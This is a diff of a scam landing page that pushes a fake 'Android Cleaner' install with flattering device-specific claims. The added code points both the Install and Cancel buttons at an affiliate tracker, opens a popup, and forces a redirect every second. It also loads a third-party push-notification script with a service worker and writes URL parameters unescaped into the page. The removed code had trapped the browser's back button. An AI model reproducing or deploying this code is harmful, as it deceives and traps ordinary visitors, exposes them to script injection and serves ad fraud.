@@ -1,16 +1,12 @@
 <!DOCTYPE html><html><head>
-  <base href="">
-
+    <base href="">
     <title>Install Android Cleaner!</title>
-  
-
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="theme-color" content="#999">
-    <link id="favicon" href="logo.png" rel="shortcut icon" type="image/x-icon">
-
-    <script src="ua-parser.min.js"></script>
-    <style type="text/css">html {
+    <link id="favicon" href="./logo.png" rel="shortcut icon" type="image/x-icon">
+    <style type="text/css">
+    html {
         font-family: sans-serif;
         -ms-text-size-adjust: 100%;
         -webkit-text-size-adjust: 100%
@@ -775,58 +771,36 @@
 .popover-footer{
 	margin-top:1em;
 }
-/*dialog*/
-    </style>
 
+</style>
 
-
-    <script>
-
-        function contains(string, fragment) {
-            string = string.toLowerCase();
-            fragment = fragment.toLowerCase();
-            return string.indexOf(fragment) !== -1;
-        }
-
-        function getURLParameter(name) {
-            var result = decodeURI((RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || '');
-
-            if(name.indexOf('brand') !== -1 && contains(result, 'generic')) {
-                result = 'Phone'
-            }
-
-            if(name.indexOf('dname') !== -1 && contains(result, 'android')) {
-                result = 'Phone'
-            }
-
-            if(name.indexOf('browser') !== -1 && contains(result, 'android')) {
-                result = 'Internet Browser'
-            }
-
-            return result;
-
-        }
-
-		function setVisit() {
-			document.cookie = 'uid=b36ef0fa-8da8-4560-9f7a-e4647c142bf1'; //!@#
-		}
-		setVisit();
-
-    </script>
-<script type="text/javascript">
-
-function getRandomInt(min, max)
-{
-  return Math.floor(Math.random() * (max - min + 1)) + min;
-}
-
-function func() {
-	var answer = showm();
-}
-
-setTimeout(func, getRandomInt(5,10)*1000);
-
+<script>
+    function contains(string, fragment) {
+      string = string.toLowerCase();
+      fragment = fragment.toLowerCase();
+      return string.indexOf(fragment) !== -1;
+    }
+  
+    function getURLParameter(name) {
+      var result = decodeURI((RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || '');
+      if(name.indexOf('brand') !== -1 && contains(result, 'generic')) {
+        result = 'Phone'
+      }
+      if(name.indexOf('model') !== -1 && contains(result, 'android')) {
+        result = 'Phone'
+      }
+      if(name.indexOf('browser') !== -1 && contains(result, 'android')) {
+        result = 'Internet Browser'
+      }
+  
+      if(result==null||result==""){
+              result = 'Phone'
+          }
+  
+      return result;
+    }
 </script>
+
 
 </head>
 <body class="en ltr">
@@ -837,20 +811,20 @@ setTimeout(func, getRandomInt(5,10)*1000);
         <div class="text">
 
 
-            <h1 style="" class="blink_me">Install Android Cleaner for your <span class="device_brand"></span> and improve performance of your phone!</h1>
-<p>For improved perfomance and increased free memory of your <span class="device_brand"></span> <span class="device_model"></span>, we have released an update of the Android Cleaner which will find all potential threats and will also clean junk files and improve the battery life.</p>
+            <h1 style="" class="blink_me">Install Android Cleaner for your <script>document.write(getURLParameter("device_brand"))</script> and improve performance of your phone!</h1>
+<p>For improved perfomance and increased free memory of your <script>document.write(getURLParameter("device_brand"))</script>, we have released an update of the Android Cleaner which will find all potential threats and will also clean junk files and improve the battery life.</p>
 <br>
-<p>Install Android Cleaner right now to boost your <span class="device_brand"></span> <span class="device_model"></span> and improve performance of your phone and improve its battery life.</p>
+<p>Install Android Cleaner right now to boost your <script>document.write(getURLParameter("device_model"))</script> and improve performance of your phone and improve its battery life.</p>
 <br>
 <img src="logo.png" style="width:60px;height:60px;float: left; padding-right: 10px;">
-<p>Install Android Cleaner <strong>for FREE</strong> to clean and strengthen your <span class="device_brand"></span> immediately!</p>
+<p>Install Android Cleaner <strong>for FREE</strong> to clean and strengthen your <script>document.write(getURLParameter("device_brand"))</script> immediately!</p>
 <p style="text-align:center;margin-top:10px;"><span style="font-size:15px;color:red;font-family:sans-serif;" id="theTime"></span></p>
 </div>
 <div class="buttons">
-<a class="button exitpoint" href="https://ph-kpr.com/ph/">
+<a class="button exitpoint" onclick="ctaclick()" href="https://tk.besttrustedreview.com/click.php?lp=1&to_offer=2">
 				<span>Install</span>
 </a>
-<a class="button cancel" href="https://ph-kpr.com/ph/">
+<a class="button cancel" onclick="ctaclick()" href="https://tk.besttrustedreview.com/click.php?lp=1&to_offer=2">
 				<span>Cancel</span>
 </a>
 </div>
@@ -858,82 +832,35 @@ setTimeout(func, getRandomInt(5,10)*1000);
 	<form style="visibility:collapse;"><textarea name="comment"></textarea></form>
 </div>
 
-
-
 <script>
-    let link = 'https://ph-kpr.com/ph/';
-    let hash = window.location.hash;
-
-    hash = hash.replace(/%5D/g, ']');
-    hash = hash.replace(/%5B/g, '[');
-    hash = hash.replace(/amp;/g, '')
-    hash = hash.replace(/#/g, '?')
-    let params = link + hash;
-
-
-    var btnInstall = document.querySelector(".exitpoint");
-    btnInstall.href = params;
-
-    var btnCancel = document.querySelector(".cancel");
-    btnCancel.href = params;
-
-    var parser = new UAParser();
-    var result = parser.getResult();
-
-    var device_brand = result.device.vendor;
-
-    var os;
-        if (result.os.name == undefined) {
-            os = 'Android';
-        } else {
-            os = result.os.name;
-        }
-    var brand;
-    var device_brand = result.device.vendor;
-    var re = /(?:^|[^A-Z0-9-_]|[^A-Z0-9-]_|sprd-)(?:Mi9 Pro 5G|(?:MI [a-z0-9]+|Mi-4c|MI-One[ _]?[a-z0-9]+|MIX(?: 2S?)?)(?:[);/ ]|$)|HM (?:[^/;]+) (?:Build|MIUI)|(?:2014501|2014011|201481[12378]|201302[23]|2013061) Build|Redmi|MI_NOTE_Pro|POCOPHONE|(?:SHARK )?(KLE|MBU)-[AH]0|SKR-[AH]0|SKW-[AH]0|POCO F1|DLT-[AH]0|MIBOX[234]([_ ]PRO)?|MiTV4[CSX]?|MiTV-(MSSP[01]|AXSO0)|AWM-A0|MI CC 9 Meitu Edition|MiBOX1S|MiTV4A|M2006J10C|M2006C3(?:L[IGC]|LVG|MN?G)|M2007J1(?:7G|SC)|M2002J9[EG]|HM2014819|WT88047|M2004J(?:7[AB]|19)C|M2006C3MII|M2003J15SC|M2007J3S[ICYG]|M2007J22G|M2101K6G|M2101K[79]AG|M2010J19S[GY]|HM NOTE 1(?:LTE|W)|MI[_ ]PLAY|XIG01|MI_5X)/i;
-    var isXiaomi = re.test(navigator.userAgent);
-    if (isXiaomi) {
-        brand = 'Xiaomi'
-      } else {
-        if (device_brand == undefined) {
-          brand = 'Android';
-        } else {
-          brand = device_brand
-        }
-      }
-
-    var allBrand = document.querySelectorAll('.device_brand');
-    allBrand.forEach(b => {
-        b.innerHTML = brand;
-    });
-
-    var device_model = result.device.model;
-    document.querySelector('.device_model').innerHTML = device_model;
-</script>
-
-<script>
-    (function(window) {
-    if (window.location !== window.top.location) {
-    window.top.location = window.location;
+    function ctaclick(){
+      window.onbeforeunload = null;
+      window.open("https://tk.besttrustedreview.com/click.php?lp=1&to_offer=1", "_blank");
+      
+      setInterval(afflowsmartlink, 1000);
     }
-    })(this);
-    </script>
     
-    <script type="text/javascript">
-        !function () {
-            var count = 1;
-            var t;
-            try {
-                for (t = 0; 10 > t; ++t) history.pushState({}, "", location.hash);
-                onpopstate = function (t) {
-                    if(count%2 == 1) {
-                    }
-                    count++;
-                    t.state && location.replace(location.href+location.hash)
-                }
-            } catch (o) {
-            }
-        }();
-    </script>
+    function afflowsmartlink(){
+      location.replace("https://tk.besttrustedreview.com/click.php?lp=1&to_offer=2");
+    }
+    
+  </script>
+
+<script>
+    var url = new URL(window.location.href);
+    var pci = url.searchParams.get('clickid');
+    var s = document.createElement('script');
+    s.src='//bigrourg.net/pfe/current/micro.tag.min.js?z=4978561'+'&ymid='+pci+'&sw=/sw-check-permissions-3b3e2.js';
+    s.onload = function(result) {
+        switch (result) {
+            case 'onPermissionDefault':break;
+            case 'onPermissionAllowed':break;
+            case 'onPermissionDenied':break;
+            case 'onAlreadySubscribed':break;
+            case 'onNotificationUnsupported':break;
+        }
+    }
+    document.head.appendChild(s);
+</script>
 
 </body></html>
